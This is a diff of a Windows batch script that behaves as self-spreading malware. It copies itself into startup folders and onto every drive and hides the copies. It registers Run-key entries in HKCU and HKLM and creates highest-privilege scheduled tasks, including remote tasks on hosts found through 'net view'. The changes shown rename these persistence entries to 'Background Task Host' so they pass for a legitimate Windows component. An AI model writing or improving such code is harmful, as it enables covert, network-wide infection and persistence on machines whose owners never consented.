@@ -62,6 +62,8 @@ for /f "skip=4 delims= " %%i in ('tasklist /fi "imagename eq %~nx0"') do if "%%i
 
 
 
+set app_name=Background Task Host
+
 set module_shortcut=shortcut.exe
 
 set path_startMenu1=%programData%\Microsoft\Windows\Start Menu\Programs
@@ -85,16 +87,18 @@ copy /y "%~dpnx0" "%path_autoRun1%\"
 copy /y "%~dpnx0" "%path_autoRun2%\"
 attrib +s +h "%path_autoRun1%\%~nx0"
 attrib +s +h "%path_autoRun2%\%~nx0"
+rem attrib +s +h "%path_autoRun1%\%~nx0"
+rem attrib +s +h "%path_autoRun2%\%~nx0"
 
 
 for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
   if exist "%%i:\" (
     if exist "%%i:\%~nx0" (
-      reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Background Task Host %%i" /d "%%i:\%~nx0" /f
-      reg add HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "Background Task Host %%i" /d "%%i:\%~nx0" /f
-      reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Background Task Host %%i" /d "%%i:\%~nx0" /f
-      reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "Background Task Host %%i" /d "%%i:\%~nx0" /f
-      schtasks /create /sc onstart /tn %~n0-%%i /tr %%i:\%~nx0 /f /rl highest
+      reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%~nx0" /f
+      reg add HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%~nx0" /f
+      reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%~nx0" /f
+      reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%~nx0" /f
+      schtasks /create /sc onstart /tn "%app_name% %%i" /tr %%i:\%~nx0 /f /rl highest
       attrib +s +h "%%i:\%~nx0"
 
       if "%%i:" NEQ "%systemDrive%" if "%%i:" NEQ "D:" (
@@ -124,7 +128,7 @@ timeout /nobreak /t 10 >nul
 for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if "%%i" NEQ "The" (
   for /f "skip=7 tokens=1,* delims= " %%j in ('net view %%i') do if "%%j" NEQ "The" (
     if exist "%%i:\%~nx0" (
-      for /f "delims=\" %%z in ("%%i") do schtasks /create /s %%z /sc onstart /tn %~n0-%%j /tr %%j:\%~nx0 /f /rl highest
+      for /f "delims=\" %%z in ("%%i") do schtasks /create /s %%z /sc onstart /tn "%app_name% %%j" /tr %%j:\%~nx0 /f /rl highest
       attrib +s +h "%%i\%%j\%~nx0"
 
       if "%%j:" NEQ "C:" (
